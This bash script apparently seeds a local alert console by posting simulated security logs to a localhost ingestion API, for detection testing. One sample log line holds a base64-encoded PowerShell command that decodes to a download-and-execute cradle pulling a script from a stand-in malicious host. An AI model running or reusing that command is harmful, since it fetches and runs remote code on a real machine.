#!/usr/bin/env bash
# Quick Start Local Threat Ingestion Script
echo "========================================================"
echo "Initializing local security log threat simulation..."
echo "========================================================"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
GENERATOR="$SCRIPT_DIR/threat_generator.py"

python3 "$GENERATOR" --attack-type all || curl -X POST -H "Content-Type: application/json" \
     -H "X-API-Key: sandbox_device_key" \
     -d '{"logs": "<86>Oct 11 14:22:10 mail sshd[24101]: Failed password for invalid user admin from 192.168.1.152 port 50122 ssh2\nCEF:0|ThreatAnalyser|CollectorAgent|1.0|PROC_01|PowerShell Obfuscated Execution|Medium|shost=device01 filePath=powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALQB1AHAAZABhAHQAZQAuAGUAeABhAG0AcABsAGUALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA== proc=powershell.exe pid=4312\n"}' \
     http://localhost:8000/api/ingest/push

echo ""
echo "[✓] Telemetry injected successfully."
echo "[✓] Check your Alert Console at: http://localhost"
